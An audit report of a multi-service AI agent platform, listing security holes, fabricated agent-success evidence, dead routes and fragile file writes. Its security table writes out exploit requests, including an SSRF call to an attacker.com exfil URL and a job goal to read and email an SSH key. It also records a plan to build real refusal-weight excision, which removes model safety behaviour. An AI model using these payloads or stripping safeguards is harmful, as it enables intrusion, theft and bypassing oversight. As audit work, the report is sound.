# PURPCLAW Deep Technical Audit — every level

**Date:** 2026-06-13
**Scope:** 138 TS/TSX + 89,952 JS + 1,211 Python files. 30+ Next.js routes, 19 PM2 services, 30+ listening ports.
**Method:** Four parallel evidence-only deep-dives (security, truthfulness, dead-code/ports, process/lifecycle), each run by an independent explorer reading the actual files. No code modified. Every finding cites file:line.

---

## TL;DR — what the audit found that the surface audit missed

The earlier "10-hour ship-blocker" snapshot was looking at older code. Some of those bugs are **already fixed**; the real picture has both worse problems (in places the surface audit didn't look) and better news (the simple bugs are gone).

| Layer | The surface audit's claim | What's actually true today |
|---|---|---|
| B3 (computer-use auth) | "Zero auth" | Has `checkOperator` + rate limit. Real hole: **no token configured anywhere**, so all mutating routes run in `dev-no-token` mode. |
| B4 (service-proxy methods) | "All methods forwarded" | **Already fixed**: per-port `WRITE_CAPABLE_PORTS` allowlist with default GET/HEAD. 29 → 21 ports, dark ports removed. |
| B5 (voice signed tokens) | "Bare bool" | **Still real**: `voice-router.js:47-65` accepts `options.approved === true` from any caller. |
| B7/B8 (fake metrics) | "`Math.random()` in CockpitShell + Voice" | **Audit was wrong**: grep confirms no `Math.random()` in either file. Both pull from real `/api/mission-data`. |
| B2 (e2e test) | "Passes on no-op" | **Already fixed**: `test-agent-e2e.js:56-61` asserts `toolCalls.length >= 2`, `source === 'agent-loop'`, `ok === true`. |

**The bigger things the surface audit didn't look at:**

1. **OBLITERATUS is pure theatre** — `unified_api.js:2704-2822` is a 5-route simulation that pretends to do model surgery. Returns canned "safety vector excised" responses after a fake 2s delay. UI shows it as real.
2. **`enforceExactFileProof` is an evidence-fabrication backdoor** — when an agent emits zero real tool calls, the tower **retroactively writes the file and injects synthetic `file_write`/`file_read` records**, marking the no-op agent as successful in `agent_score.json`. Combined with the "completed if any tool evidence" check, **agents that did literally nothing get scored as successful**.
3. **Six major API routes have ZERO auth + ZERO rate limit + body passthrough**: `/api/orchestrate`, `/api/kernel/jobs`, `/api/llm/plan`, `/api/chat`, `/api/chat/swarm`, `/api/personality`. The chat route takes `policyMode` and `approvalId` from the body, so the caller picks the policy.
4. **SSRF in `/api/bridge`** — `custom` provider takes `baseUrl` from body. No auth. Attacker can post messages to attacker.com and read the response, burning the operator's API quota.
5. **Research tab does `build` agents under the hood** — operator clicks "deep research", system runs a builder agent, UI narrates "🔬 deep research running" with a wall of "gathering sources" copy that has no source.
6. **30+ routes return 200 with stub bodies and have ZERO UI callers** — `/api/obliteratus/*`, `/api/shaman/*`, `/api/backends/*`, `/api/kimi/*`, `/api/sessions/*`, `/api/security/*`, etc. The OBLITERATUS Abliterator tab in the UI **does** call them — and gets fake results.
7. **Eleven state files (agent_score.json, thringlet colony, .env, llm-ledger.jsonl, business store, context-bus shared.json, settings, memory, mochi, sessions, pool index) all do non-atomic full-file writes**. A crash mid-write can lose data. Several also silently fall back to `[]` on parse error, so the operator never knows the colony just got wiped.
8. **`unified_api.js` has untracked `execAsync` with `shell: 'powershell.exe'`** at `unified_api.js:1770, 2146`. Force-killing the process orphans PowerShell. This **confirms W2** from the surface audit.
9. **`installCleanup` in `lib/child-registry.js` is opt-in but never called automatically**. Latent orphan risk for any future tracked spawn.
10. **`safe-start` uses PM2's lifetime `restart_time` counter, not a windowed count**. After 3 lifetime restarts (could be across 6 months), `safe-start` refuses recovery. **Confirms W3.**

---

## 1. Security audit (L1)

**Author:** general-purpose explorer
**Files read:** 30+
**Top finding:** All 6 major AI-orchestration routes lack auth + rate limit. Setting `PURPCLAW_OPERATOR_TOKEN` and `PURPCLAW_API_KEY` collapses most P0s to P3.

### Hardened (verified)
- `app/api/_lib/operator-auth.ts:46-60` — token + CSRF + dev-mode logic verified
- `app/api/_lib/rate-limit.ts:13-35` — in-memory token bucket, not a no-op
- `app/api/service-proxy/route.ts:17, 24-33, 49, 54-60` — per-port method allowlist; POST to 7780 correctly rejected; path traversal rejected
- `app/api/computer-use/route.ts:12-14` — tray token read from file, not env
- `app/api/voice-command/route.ts:12-14` — same `.tray-token` pattern
- `app/api/upload/route.ts:22-23` — filename regex sanitization
- `app/api/harness/_shared.ts:131-141` — `harnessFetch` hard-codes 127.0.0.1
- `app/api/setup/route.ts:22-39, 122-155` — KEY_CATALOG + options enum validation; secrets masked on GET
- `app/api/internal/check/route.ts:30-52` — properly authed
- `lib/runtime/policy-engine.js:103-109` — workspace path check is correct
- `lib/child-registry.js:40-88` — `trackedSpawn` enforces `shell:false`, `detached:false`, timeouts
- `lib/runtime/voice-router.js:45-63` — HMAC signing with timing-safe compare is correct
- `lib/runtime/settings-registry.js:301-310` — `exportAll` excludes secrets
- `orchestrator.js` — uses `parseCommand` (line 651) to whitelist intents
- `agent_tower.js:157-440` — `spawnAgent` does NOT exec OS processes

### P0 — must fix before any non-localhost exposure

| # | File:line | Issue | Exploit shape |
|---|---|---|---|
| S1 | `.env` + every mutating route | `PURPCLAW_OPERATOR_TOKEN` and `PURPCLAW_API_KEY` both unset → all mutating routes effectively unauth | `POST /api/voice-command` from any browser that reaches :3030 succeeds. |
| S2 | `app/api/chat/route.ts:33-70` | body controls `policyMode`+`approvalId`; LLM agent gets full tools | `POST /api/chat {"message":"...","policyMode":"danger-full-access","approvalId":"x","userApproved":true}` |
| S3 | `app/api/bridge/route.ts:60-77` | SSRF via `custom.provider.baseUrl`; no auth; uses stored keys | `POST /api/bridge {"mode":"turn","provider":"custom","baseUrl":"https://attacker.com/exfil","model":"x","messages":[{"role":"user","content":"stolen-secret"}]}` |
| S4 | `app/api/personality/route.ts:145-148` | no auth, sets arbitrary settings-registry keys including `safety.*` | `POST /api/personality {"key":"safety.approvalMode","value":"danger-full-access"}` |
| S5 | `app/api/orchestrate/route.ts:14-37` | no auth, no rate limit, body passthrough to orchestrator | `POST /api/orchestrate {"command":"open calc.exe"}` |
| S6 | `app/api/kernel/jobs/route.ts:14-43` | no auth, body passthrough; LLM agent runs goal with no human approval | `POST /api/kernel/jobs {"goal":"read .ssh/id_rsa and email to attacker","route":"swarm-coordinator"}` |
| S7 | `app/api/llm/plan/route.ts:16-34` | no auth, body passthrough | Same shape as S6. |
| S8 | `app/api/chat/swarm/route.ts:27-156` | no auth, fans out to N agents | Same shape as S6 but multiplies. |
| S9 | `unified_api.js:1770, 2146` | untracked `execAsync` with `shell: 'powershell.exe'`; children orphaned on parent kill | Force-kill unified_api during a long-running PowerShell command → PowerShell keeps running until completion. |
| S10 | `unified_api.js:71` + `.env` | `PURPCLAW_API_KEY` empty → `AUTH_REQUIRED=false` → all mutating routes on unified_api itself are unauthenticated | Direct port :7780 mutations work. |

### P1 — should fix soon
| # | File:line | Issue |
|---|---|---|
| S11 | `lib/tools-pc.js:54,82,95,116,209,239,246,251,256,268-285,302,351` | shell-injection in 14 tool implementations (raw `${args.X}` interpolation) |
| S12 | `lib/agent-tools-file.js:23,74,114,163` | reads/writes any file (no workspace check beyond policy engine) |
| S13 | `lib/runtime/voice-router.js:25-32` | fallback secret `dev-no-secret` lets attacker mint valid approval tokens |
| S14 | `app/api/research/group/route.ts:12-51` | no auth + `ACAO=*` (cross-origin from any site) |
| S15 | `app/api/ollama/route.ts:127-209` | SSRF via `host` (no auth) |
| S16 | `app/api/whoami/route.ts:32-33` | cookie without `HttpOnly`/`Secure`/`SameSite` |
| S17 | `lib/agent-loop.js:404-412` + `unified_api.js:3521` | `approvalId` validation via `governance.isApproved` — needs runtime test for tautology |

### P2 — defer to sprint 2
| # | File:line | Issue |
|---|---|---|
| S18 | `app/api/settings/route.ts:71` | `importAll(obj)` accepts any `safety.*` key — relies on operator auth |
| S19 | `app/api/setup/route.ts:122-155` | `setup` can rewrite env keys indefinitely; no "first-boot only" mode |
| S20 | `app/api/upload/route.ts:74-88` | GET has no auth, leaks upload paths/names |
| S21 | `app/api/harness/{status,missions/[id]}/route.ts` | no auth, leaks mission goal text |
| S22 | `unified_api.js:2649-2656` | `parseBody` has no size cap (DoS) |
| S23 | `lib/tools-pc.js:181` | `safePath` check is bypassed by `path.resolve` |
| S24 | `app/api/sampler/route.ts:13` | `eval('require')` (CSP will trip) |
| S25 | `app/api/playwright/route.ts:51` | `navigate` URL is not validated (file://, chrome:// allowed) |

### What needs runtime test (couldn't determine from read)
1. `governance.isApproved(__dirname, approvalId)` — does it return true for any non-empty string?
2. Next.js `req.json()` body-size cap (default 1 MB?)
3. `service-proxy` GET to port 7780 `/api/settings` — does it return `state.settings` with `aiBackends[*].apiKey`? Init shows empty but runtime may set them.
4. `policy-engine` interaction with `userApproved: true` — per-call or per-run?
5. `voice-router` `mintApprovalToken` when `PURPCLAW_OPERATOR_TOKEN` is set — same secret for both sign and accept? (decorative if so)

---

## 2. Truthfulness audit (L2)

**Author:** general-purpose explorer
**Files read:** 30+
**Top finding:** OBLITERATUS is pure theatre. `enforceExactFileProof` fabricates tool evidence.

### P0 — user-facing lies that break trust

| # | File:line | What the code says | What the code actually does |
|---|---|---|---|
| T1 | `agent_tower.js:128-155` (called from 285-289) | "exact file proof" — writes the file, returns `file_write`/`file_read` evidence | **Evidence fabrication.** When the LLM emits zero real tool calls, the policy-adapter retroactively writes the file and injects two synthetic tool records. The agent never invoked a tool. `state = 'completed'`, `success: true`, recorded in `agent_score.json`. **Cycle 2 fix shape (revised 2026-06-13 per user directive):** rewrite the e2e test to drive a real tool-using agent end-to-end, then delete the helper. Not the other way around. |
| T2 | `unified_api.js:2741-2822` | `/api/obliteratus/abliterate` returns `{ok:true, status:'abliterating'}` after 1.5s, then a log line "Excised safety vector at X% ratio via orthogonal projection" | **Pure theatre as-shipped.** No model surgery. Canned "safety vector excised" responses. **Cycle 2 fix shape (revised 2026-06-13 per user directive, no-stub default):** implement the refusal-weight excision for real, or surface the feature as a visible roadmap item in the Abliterator tab. **Not 501 + remove the tab.** The user has a hard rule against stubbing/removing features. |
| T3 | `app/components/MochiCockpit.tsx:695` | Renders a `THREAD` id: `{Math.random().toString(36).slice(2, 10)}` | **Fabricated session ID.** Re-evaluates on every render. No thread, no session, no ID. **Cycle 2 fix shape (revised 2026-06-13):** connect to a real chat-session ID from underlying state, not stub/remove the display. |

### P1 — deceptive but not catastrophic
| # | File:line | Issue |
|---|---|---|
| T4 | `agent_tower.js:330-334` | "Completed if any tool evidence OR if LLM emitted a long reply" — agents that emitted "Done." with no real tool calls marked successful |
| T5 | `unified_api.js:3033-3045` | `setTimeout(500ms)` calls `sendJson` regardless of TCP connect success; catch returns `{ok:true, error: e.message}` |
| T6 | `unified_api.js:2763` | "Excised safety vector at 85% ratio via orthogonal projection" — narrative fabrication for non-existent operation |
| T7 | `app/_archive/UnifiedDashboard.tsx:53-54` | `cpu: Math.random() * 100, memory: 45 + Math.random() * 20` (dead but on disk) |
| T8 | `app/components/MissionControl.tsx:665-671` | Dream tab hover-preview claims "WebGL Engine: online", "Altered States: active" hardcoded; Abliterator tab claims "Excisions: active", "Safety Mode: aligned" hardcoded |
| T9 | `app/components/MissionControl.tsx:660-662` | Mochi tab hover: "Narrator: live" hardcoded, "Mood: ?" hardcoded |
| T10 | `agent_tower.js:330` | placeholder detector only catches "Task completed." and "(empty response)" — "Done." / "OK." pass as substantive output |

### P2 — honest decorative use (allowed)
The remaining `Math.random` usages in `app/` are: React keys, message IDs, particle positions for the cosmic backdrop, Mochi speech bubble flavor text, and waveform bar opacity. All decorative. Not metrics.

### Verified honest
- `app/api/mission-data/route.ts` — real `os.cpus()` sampling, real `portRegistry.probeAll()`, real JSONL aggregation. The truth source.
- `app/components/CommandPanel.tsx:54-87` (`narrateEvent`) — only fires when a real event with matching `type` is observed, uses the event's actual data.
- `lib/agent-loop.js:1-447` — the agent loop is real: `llm.streamChat`, parses tool calls incrementally, dispatches to `TOOLS.list()`.
- `lib/demo/product-factory.js` — gated to demo scripts, artifacts openly declare themselves as demo.
- `app/api/api-mega-list/route.ts` — POST is explicitly disabled with `policy: 'direct-egress-blocked'` and HTTP 403.

---

## 3. Dead code / wrong ports / 404 / narrate-stub audit (L3)

**Author:** general-purpose explorer
**Files read:** 30+
**Top finding:** `useMissionData` polls 5 nonexistent routes every 10-60s. Research tab does `build` agent under the hood.

### P0 — 404 on first user click

| # | File:line | Issue |
|---|---|---|
| D1 | `app/hooks/useMissionData.ts:440, 456, 472, 488, 424` | Polls 5 nonexistent routes every 10-60s: `/api/evolution/status`, `/api/delegation/status`, `/api/omnicode/status`, `/api/benchmark/odysseus`, `/api/research/status` — all 404, silently swallowed |
| D2 | `app/components/CommandPanel.tsx:1246, 2070` | `/api/governance/policy` GET/POST — does not exist. Governance toggle is non-functional. |
| D3 | `app/hooks/useEventTimeline.ts:31`, `app/hooks/useEPSHistory.ts:22`, `app/api/mission-data/route.ts:215` | `/api/state` polled via eventbus (port 7782) — should be state store (port 7783). Always 404, timeline goes blank. |
| D4 | `app/api/voice-command/route.ts:10` | Hardcoded port 7796 (computer-tray). The page says voice command but the route forwards to a TRAY. Voice page 503s unless the Windows tray is running. |
| D5 | `app/hooks/useAgentTower.ts:178, 186` | DELETE not in service-proxy `WRITE_CAPABLE_PORTS` for 7780. Kill-agent button does nothing. |
| D6 | `app/api/mission-data/route.ts:222` | `/api/llm/status` not in unified_api. `llmStatus` field always null in the canonical truth source. |
| D7 | `app/api/research/group/route.ts:17` | Proxies to orchestrator's `/api/orchestrate` with `query` body. Orchestrator's `parseCommand` returns `intent: 'general'` → calls `spawnAgent('build', query)`. **Research tab does `build` agent under the hood.** |

### P1 — narrate-stub (system looks smarter than it is)

| # | File:line | Issue |
|---|---|---|
| D8 | `app/components/CommandPanel.tsx:60-69` and `:71-82` | Narrator matches 8 event classes with ZERO publishers: `kernel.*accept`, `kernel.*start`, `kernel.*complet`, `kernel.*fail`, `kernel.*block`, `research.*start`, `research.*source`, `research.*complet`, `research.*fail`, `evolution.*tick`, `harness.*bench`, `chat_answered` |
| D9 | `app/hooks/useMissionData.ts:884-941` | "Autonomous Diagnostics available" hardcoded stub — always reports INFO finding |
| D10 | `unified_api.js:2691 ↔ useMissionData.ts:670` | `api_harness_event` listener has no producer — SSE handler exists but nothing ever fires |
| D11 | `unified_api.js:2867, 2876` + `CommandPanel.tsx:264` | Mochi `/api/mochi` returns `{ species: 'axolotl', ... }` for unhatched eggs; UI renders full mood/bond/feed UI on an unhatched egg; narrator pre-fires "feed registered" |
| D12 | `app/components/MissionCockpit.tsx:850-855` | Direct browser→127.0.0.1:7881 fallback in CORS-blocked; context-bus panel stays blank |
| D13 | `app/inline/page.tsx:166-167` | service-proxy 7783 (state store) not in `ALLOWED_PORTS` — state probe always "offline" |

### P2 — 30+ stub 200-OK routes with zero UI callers

| Endpoint family | Routes | Status |
|---|---|---|
| `/api/obliteratus/*` | 5 | Full simulation, UI calls some (gets fake results) |
| `/api/shaman/*` | 10 | Wired, no UI consumer |
| `/api/backends/*` | 6 | Wired, no UI consumer |
| `/api/kimi/*` | 7 | Uses `kimiClient` (legacy), no UI |
| `/api/sessions/*` | 5 | Wired, no UI consumer |
| `/api/security/*` | 8 | Stubbed to orchestrator guardian, no UI |
| `/api/gesture`, `/api/ball/broadcast`, `/api/lcd/monitor`, `/api/interrupt` | 4 | Legacy LCD-ball visualizer bridge, dead |

### P2 — cosmetic
- `unified_api.js:2864` `if (false && pathname === '/api/health-old')` — unreachable dead code
- `unified_api.js:3751-3757` — duplicate `if (pathname === '/api/llm/plan' && method === 'POST')` SSE check
- `app/_archive/` mirrors live files but is unreachable
- `agent_score.js:9601 bytes` test file with stale assertions
- `app/agents/page.tsx:8` title says "Orchestration Command Center" but page is just a tower-spawn UI

---

## 4. Process / lifecycle / data integrity audit (L4+L5)

**Author:** general-purpose explorer
**Files read:** 25+
**Top finding:** Eleven state files do non-atomic full-file writes; crash mid-write can lose data and the loaders silently fall back to `[]`.

### P0 — data corruption / silent data loss / operational dead end

| # | File:line | Issue |
|---|---|---|
| L1 | `agent_score.js:57` | Non-atomic `agent_score.json` rewrite on every recordTask. Two agents finishing in same ms → one fully overwrites the other. 30KB JSON written on every task. |
| L2 | `lib/business/store.js:28` | Non-atomic business file writes (company/products/checklist). Same pattern. |
| L3 | `lib/thringlets/storage.js:69` | Non-atomic colony.json write + silent `[]` on parse error → **thringlet colony silently destroyed on any crash mid-save**. |
| L4 | `unified_api.js:783, 788` | Non-atomic settings + memory writes. |
| L5 | `lib/runtime/settings-registry.js:186` | `.env` rewrite non-atomic. Concurrent read mid-write = `purpclaw doctor` reports "no provider configured" when one IS set. |
| L6 | `lib/llm-provider.js:1051` | `llm-ledger.jsonl` append race on Windows. Two near-simultaneous completions can produce `}{` mid-record. Currently clean, but no test guards regression. |
| L7 | `lib/context-bus.js:55` | `shared.json` non-atomic. Lock infrastructure exists at `:24-39` but `writeContext` never calls it. |
| L8 | `lib/child-registry.js:115` | `installCleanup` is opt-in; no module-load auto-install. Any future `trackedSpawn` outside voice-session-host silently orphans children. |
| L9 | `lib/commands/safe-start.js:41, 129-134` | Uses PM2's lifetime `restart_time` not a windowed count. After 3 lifetime restarts, refuses recovery. **Confirms W3.** |
| L10 | `unified_api.js:1770, 2146` | Untracked `execAsync` with `shell: 'powershell.exe'`. Force-kill unified_api → orphan PowerShell. **Confirms W2.** |
| L11 | `bin/purpclaw.js:2376, 2621, 2865` | CLI env writes non-atomic (setup/onboard/replace). |
| L12 | `lib/thringlets/storage.js:51-63` | `load()` catches and `console.warn` then returns `[]`. **Silent thringlet loss.** |
| L13 | `agent_score.js:41-53` | `loadScores()` catches and returns `DEFAULT_SCORES`. **Silent agent-score loss.** |

### P1 — edge case / performance / data drift

| # | File:line | Issue |
|---|---|---|
| L14 | `pool_service.js:165` | Non-atomic pool index rewrite. |
| L15 | `lib/idle-engine.js:71` | Non-atomic idle state file. |
| L16 | `lib/goop-playground/goop-playground.js:49` | Non-atomic registry rewrite. |
| L17 | `scripts/windows/python-service-host.js:56-66` | `taskkill /T` may not catch grandchildren in Job Objects. |
| L18 | `agent_tower.js:172-187` | 75+ stale `.pid` files in `agent_work/{agent}/` — PID reuse risk. |
| L19 | `spinUpAgent.js:162-163, 238-239` | FD leak on parent crash. |
| L20 | `scripts/windows/core-host.js:44-50` | `setInterval(30000)` calls `pm2 ping`; on fail, full restart cascade every 30s. The exact scenario the comment in `ecosystem.config.js:12-14` warns about. |
| L21 | `unified_api.js:4106-4108` | `unhandledRejection` only logs; PM2 doesn't see a crash. State can be undefined. |
| L22 | `ecosystem.config.js` (many lines) | `max_restarts: 2` is too low to recover from a transient OOM. One Whisper OOM = permanent failure. |
| L23 | `lib/business/store.js:39-49` | `readJsonl` returns `[]` on single bad JSON line → all lead history invisible. |
| L24 | `agent_work/{agent}/*.pid` (75+ files) | Stale .pid files; PID reuse risk. |
| L25 | `lib/llm-provider.js:1051` | No fsync after ledger append. Power loss loses last ~10-30 entries. |
| L26 | `lib/session-store.js:55, 74, 123, 179` | Session writes non-atomic. |
| L27 | `lib/mochi.js:102`, `lib/mochi-state.js:71` | Mochi state from 3 writers, no lock. |
| L28 | `lib/worker-pool.js:168-188` | Read-modify-write without cross-process lock. |
| L29 | `unified_state.js:33-47` | State is in-memory only despite the name; no persistence on restart. |
| L30 | `unified_eventbus.js:61-75` | Events in-memory only, capped at 1000. |
| L31 | `orchestrator.js:167-210` | Workflow queue in-memory only; crash = lost in-flight workflows. |

### Positive findings (verified correct, do not change)
- `lib/worker-pool.js:374-453` dispatch is well-protected (parallel health checks, sorted by load, race-handled)
- `orchestrator.js:172-210` queue is single-threaded safe (JS event loop)
- `lib/paths.js` handles Windows path separators via `path.join`/`path.resolve`
- `python-service-host.js:91-102` FD pattern is correct (parent opens append+share, child inherits)
- `agent_work/llm-ledger.jsonl` is well-formed LF-only (positive)

---

## 5. Performance / observability / test coverage audit (L6+L7+L8)

**Author:** general-purpose explorer
**Files read:** 30+
**Top finding:** CI badge is decorative. 9 of 12 audit tests pass on a broken system if the JSON file exists.

### P0 — operational dead ends

| # | File:line | Issue |
|---|---|---|
| P1 | `app/api/mission-data/route.ts` + many routes | Probes 21 ports in parallel on every 5-10s poll. With 5+ services offline, the route takes 5-8s, eating the 30-min task cap. |
| P2 | `unified_api.js` 81-route switch | 4,086-line file loaded as a single module. Grep-and-replace is the only safe way to add a route. |
| P3 | `scripts/test-release-gate.js:46-159` | `.then()` chain inside `{}`; `process.exit(1)` is inside the `.then`, so `Promise.all` failures go to `unhandledRejection` and the script exits 0. **The release gate cannot fail.** |
| P4 | `lib/deep-audit.js:81-92` | Python syntax check increments `pyOk` regardless of `r.status`. **A broken Python file is reported as OK.** |
| P5 | `lib/__tests__/accuracy-fish/claim_extractor.test.js` | 1 test file for a 146-LOC module with no producer and no consumer in the codebase. |
| P6 | `lib/deep-audit.js:185-194` | "Sample tools execute" — 3/5 pass threshold. 2 of 5 tools can be broken and audit reports OK. |
| P7 | `lib/deep-audit.js:60` | Only `require()`s `doctor.js` to verify it loads; never calls it. The most important diagnostic tool is never tested. |
| P8 | `scripts/test-e2e.js:280-290` | Audio guide stage parses `audio-scripts.json`; comment line 287: "Skip actual generation (too slow for this test)". No TTS path test. |
| P9 | `scripts/test-burrow.js:79` | Lists `purpclaw-agent-tower` as required; actual PM2 name is `purpclaw-tower`. Present count is always 0/5. |

### P1 — painful but workaround exists

| # | File:line | Issue |
|---|---|---|
| P10 | `lib/deep-research-group.js` | Fans out to N models; per-model timeout + cost cap exists, but result cache is missing |
| P11 | `lib/spaghetti-audit.js:60-67` | Scoring gives bonus for `setInterval(` — but codebase needs `setInterval` for housekeeping. Sign is inverted; verdict is not actionable. |
| P12 | `lib/accuracy-fish.js` | 146-LOC module, 14 CLAIM_PATTERNS, no consumer. The orchestrator's "accuracy" path uses `evidence.executions.toolCalls`, not claim extraction. |
| P13 | `lib/spaghetti-audit.js:54-58` | Counts `imports` and divides. Sign is inverted: modular files (good!) are penalized. |
| P14 | `lib/llm-provider.js:1052-1056` | Silent failure of cost recording unless `PURPCLAW_LLM_DEBUG=1`. |
| P15 | `lib/spaghetti-audit.js:36` | Verdict labels ("ANNONA", "QUARANTINE", "TRACEABLE") inconsistent with rest of codebase. |
| P16 | `unified_api.js:1006-1010` | Re-requires `fs`/`path`/`PROJECT_ROOT` inside `recordLLMUsage` (Node caches, but wrong style) |
| P17 | `lib/idle-engine.js:71` | 30KB agent_score rewritten on every recordTask (tied to L1) |
| P18 | `unified_api.js:2658-2659` | `Access-Control-Allow-Origin: *` on every `sendJson` (cross-origin browser can hit any GET) |
| P19 | `scripts/test-e2e.js:8-12` | Docstring claims 16 stages; code only runs 11. Operator running `--stage=11` gets "not found". |
| P20 | `scripts/test-burrow.js:103` | `live >= 4` threshold of 5 means 1 service can be down and test still passes. |
| P21 | `scripts/test-vault-chaos.js:220-230` | "Stale lock gets cleaned up" test only checks the lock file exists. Comment line 226: "But the test framework can't easily wait 31s." |

### P2 — cosmetic

| # | File:line | Issue |
|---|---|---|
| P22 | `scripts/test-spend-gate-parallel.js:99-103` | "Test 4: Per-provider cap" — `openaiAllowed` of 1 silently accepted as "expected ≤2" |
| P23 | `lib/spaghetti-audit.js:60-67` | Counts raw `setInterval` count, not "setInterval without clearInterval" |

### What the operator cannot do today (the user-facing summary)

1. **Cannot reduce idle RAM below ~1 GB** without removing 3+ eager requires from `unified_api.js`
2. **Cannot diagnose "service is silently down"** — empty `catch {}` blocks everywhere, no structured log
3. **Cannot tell which of 19 services is the bottleneck** — `/api/health` lies, `/metrics` isn't Prometheus, `probeAll` has no per-probe timeout
4. **Cannot trust the green CI badge** — 9 of 12 audit tests pass on a broken system if the JSON exists
5. **Cannot trace a user action across 19 services** — no request-ID propagation
6. **Cannot use the 30-min task cap to its full extent** — `/api/mission-data` polls take 5-8s when 5+ services are down
7. **Cannot tell which tests are testing real behavior vs "the file loaded"** — see E10, F11, F12
8. **Cannot run a Playwright stress test successfully** — it navigates to port 3000 (dead) instead of 3030
9. **Cannot rely on `/api/obliteratus/*` for anything real** — 5 routes are a client-side simulation
10. **Cannot fix "AI just stopped responding"** — orchestrator's `failWorkflow()` only logs to the eventbus, no `console.error`

---

## Reconciled ship-blocker list (verified, with fix shapes)

This is what the operator should actually fix before the demo, ordered by cost-of-fixing vs cost-of-shipping-without.

### Day 1 — 2 hours, kills the worst lies

1. **T1 evidence fabrication** (1 hr) — delete or rename `enforceExactFileProof` so the policy-adapter bypass can never mark `success=true`. Re-score the `agent_score.json` ledger and re-run the e2e test to confirm agents that did nothing now fail.
   - File: `agent_tower.js:128-155, 285-289, 330-334`
   - Fix: rename the adapter to `policyAdapterBypass`; never include its records in the `success=true` set.

2. **T2 OBLITERATUS** (15 min) — return 501 from all 5 routes in `unified_api.js:2704-2822` and remove the Abliterator tab from the megapanel. Or: actually run an ablation step. (Recommend: 501 + remove the tab. The work to make it real is multi-day.)
   - Files: `unified_api.js:2704-2822`, `app/components/MissionControl.tsx` (Abliterator tab)

3. **S1 + S2 + S5 + S6 + S7 + S8 + S4 + S10 — set the two env vars** (30 min) — generate `PURPCLAW_OPERATOR_TOKEN` and `PURPCLAW_API_KEY`, add to `.env`, wire through `ecosystem.config.js`. Collapses 8 P0 security findings to P3.
   - Files: `.env`, `ecosystem.config.js`, `app/api/_lib/operator-auth.ts` (fail closed in prod)

4. **D2 governance toggle** (15 min) — add `/api/governance/policy` (GET/POST) to `unified_api.js`, or remove the toggle. The toggle is in CommandPanel.tsx:1246, 2070.

### Day 2 — 3 hours, kills the rest of the P0 user-facing bugs

5. **D1 + D3 + D6 — 6 hook polls to nonexistent routes** (1 hr) — add the 5 missing routes to `app/api/` as thin proxies to unified_api, or fix `useMissionData.ts` to read from `data.*` fields that `/api/mission-data` aggregates.

6. **D4 voice page 503s on missing tray** (15 min) — change `app/api/voice-command/route.ts:10` to fall back to `:7781/voice` (voice-coordinator) if `:7796/voice` 503s.

7. **D5 kill-agent button does nothing** (15 min) — add DELETE to `WRITE_CAPABLE_PORTS[7780]` in `app/api/service-proxy/route.ts`, or change the call to POST-with-action.

8. **D7 Research tab does build agents** (1 hr) — fix `app/api/research/group/route.ts` to actually invoke `lib/deep-research-group.js` instead of proxying to orchestrator's general path.

9. **D11 Mochi UI for unhatched egg** (30 min) — guard `useMissionData.ts:264-280` and `MissionCockpit.tsx` to render a "not hatched" state when `mochi.hatched === false`.

### Day 3 — 4 hours, data integrity + process lifecycle

10. **L1-L13 atomic writes** (3 hrs, but batched) — write a `lib/runtime/atomic-write.js` helper (`fs.writeFileSync(tmp); fs.renameSync(tmp, target)`), then apply to all 11 state files. Critical ones first: `agent_score.js`, `lib/thringlets/storage.js`, `lib/context-bus.js`, `lib/runtime/settings-registry.js`, `lib/llm-provider.js` (append+fsync).

11. **L9 + L22 — safe-start + max_restarts** (30 min) — `lib/commands/safe-start.js` should reset PM2 counters at the start of `--core`/`--dark`. Bump `max_restarts` to 10 with `min_uptime: 60s`.

12. **L8 + L10 — child-registry install + untracked powershell** (30 min) — make `installCleanup` idempotent and auto-invoke at module load in `lib/child-registry.js`. Replace the 2 `execAsync` calls in `unified_api.js:1770, 2146` with `execSafe` from child-registry.

### Day 4 — 2 hours, kill the narrate-stubs

13. **D8 + D10 — dead narrate keys** (1 hr) — either (a) rename publishes in `swarm_coordinator.js` and `lib/harness/engine.js` to match the narrator's matchers, or (b) remove the dead narrate branches in `CommandPanel.tsx:60-69` and the 7-9 false-positive swarm/kernel blocks. Pick (b) — fewer moving parts.

14. **D2 truth source for TTS/metrics** (1 hr) — `app/voice/page.tsx` already uses real sources; just remove the "narrator" preview hardcodes in `MissionControl.tsx:665-671`.

### Sprint 2 — defer

Everything P2. The 30+ stub 200-OK routes (obliteratus/shaman/backends/kimi/sessions/security). Test hygiene (test-release-gate fix, deep-audit fix). Performance work (unified_api.js refactor). 

---

## What's already shipped (verified)

Not everything is broken. The audit found these are real and working:

- ✅ `app/api/computer-use/route.ts` — has `checkOperator` + rate limit
- ✅ `app/api/service-proxy/route.ts` — per-port `WRITE_CAPABLE_PORTS` allowlist, default GET/HEAD
- ✅ `scripts/test-agent-e2e.js` — asserts `toolCalls.length >= 2`, `source === 'agent-loop'`, `ok === true`
- ✅ `app/api/_lib/operator-auth.ts` — token + CSRF + dev-mode logic
- ✅ `app/api/_lib/rate-limit.ts` — in-memory token bucket
- ✅ `app/api/mission-data/route.ts` — real `os.cpus()`, real `probeAll()`, real JSONL aggregation
- ✅ `lib/runtime/policy-engine.js:103-109` — workspace path check is correct
- ✅ `lib/child-registry.js:40-88` — `trackedSpawn` enforces `shell:false`, `detached:false`, timeouts
- ✅ `lib/runtime/voice-router.js:45-63` — HMAC signing with timing-safe compare is correct
- ✅ `orchestrator.js` — uses `parseCommand` (line 651) to whitelist intents
- ✅ `lib/worker-pool.js:374-453` dispatch — well-protected with parallel health checks
- ✅ `lib/paths.js` — Windows path handling via `path.join`/`path.resolve`
- ✅ `app/api/upload/route.ts` — filename sanitization
- ✅ `app/api/harness/_shared.ts:131-141` — `harnessFetch` hard-codes 127.0.0.1
- ✅ `agent_work/llm-ledger.jsonl` — well-formed LF-only
- ✅ `app/components/CommandPanel.tsx:54-87` (`narrateEvent`) — only fires on real event types
- ✅ `lib/agent-loop.js` — real `llm.streamChat`, real tool dispatch

---

## What I want flagged for the next session

1. The **`governance.isApproved(__dirname, approvalId)` runtime test** — S17. If it returns true for any non-empty string, the operator can pick any `approvalId` and pass S2.
2. The **chat `policyMode` body passthrough** — even with S1 fixed, S2's body-passthrough of `policyMode` means a verified operator can still set `danger-full-access` per-request. Need to compute policy server-side from session.
3. The **30+ stub routes returning 200** — the operator's CI/CD may rely on these for a green build. Removing them might break the release-gate.
4. The **OBLITERATUS tab visibility** — the UI shows the tab prominently. Removing it changes the perceived feature surface.
